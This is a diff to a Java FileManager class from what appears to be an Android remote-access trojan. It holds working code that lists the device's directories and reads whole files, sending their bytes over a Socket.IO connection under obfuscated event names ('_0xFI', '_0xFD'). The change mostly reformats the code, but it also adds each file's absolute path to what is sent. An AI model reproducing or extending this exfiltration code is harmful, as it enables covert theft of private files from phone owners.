@@ -16,19 +16,19 @@ import java.io.IOException;
 public class FileManager {
 
 
-    public static JSONArray walk(String path){
+    public static JSONArray walk(String path) {
 
 
         // Read all files sorted into the values-array
         JSONArray values = new JSONArray();
         File dir = new File(path);
         if (!dir.canRead()) {
-            Log.d("cannot","inaccessible");
+            Log.d("cannot", "inaccessible");
             try {
                 JSONObject errorJson = new JSONObject();
                 errorJson.put("type", "error");
                 errorJson.put("error", "Denied");
-                IOSocket.getInstance().getIoSocket().send("_0xFI" , errorJson);
+                IOSocket.getInstance().getIoSocket().send("_0xFI", errorJson);
             } catch (JSONException e) {
                 e.printStackTrace();
             }
@@ -36,22 +36,22 @@ public class FileManager {
 
         File[] list = dir.listFiles();
         try {
-        if (list != null) {
-            JSONObject parenttObj = new JSONObject();
-            parenttObj.put("name", "../");
-            parenttObj.put("isDir", true);
-            parenttObj.put("path", dir.getParent());
-            values.put(parenttObj);
-            for (File file : list) {
-                if (!file.getName().startsWith(".")) {
-                    JSONObject fileObj = new JSONObject();
-                    fileObj.put("name", file.getName());
-                    fileObj.put("isDir", file.isDirectory());
-                    fileObj.put("path", file.getAbsolutePath());
-                    values.put(fileObj);
+            if (list != null) {
+                JSONObject parenttObj = new JSONObject();
+                parenttObj.put("name", "../");
+                parenttObj.put("isDir", true);
+                parenttObj.put("path", dir.getParent());
+                values.put(parenttObj);
+                for (File file : list) {
+                    if (!file.getName().startsWith(".")) {
+                        JSONObject fileObj = new JSONObject();
+                        fileObj.put("name", file.getName());
+                        fileObj.put("isDir", file.isDirectory());
+                        fileObj.put("path", file.getAbsolutePath());
+                        values.put(fileObj);
+                    }
                 }
             }
-        }
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -60,13 +60,13 @@ public class FileManager {
         return values;
     }
 
-    public static void downloadFile(String path){
+    public static void downloadFile(String path) {
         if (path == null)
             return;
 
         File file = new File(path);
 
-        if (file.exists()){
+        if (file.exists()) {
 
             int size = (int) file.length();
             byte[] data = new byte[size];
@@ -74,10 +74,13 @@ public class FileManager {
                 BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
                 buf.read(data, 0, data.length);
                 JSONObject object = new JSONObject();
-                object.put("type","download");
-                object.put("name",file.getName());
-                object.put("buffer" , data);
-                IOSocket.getInstance().getIoSocket().send("_0xFI" , object);
+                object.put("type", "download");
+                object.put("name", file.getName());
+
+                object.put("path", file.getAbsolutePath());
+
+                object.put("buffer", data);
+                IOSocket.getInstance().getIoSocket().send("_0xFD", object);
                 buf.close();
             } catch (FileNotFoundException e) {
                 e.printStackTrace();
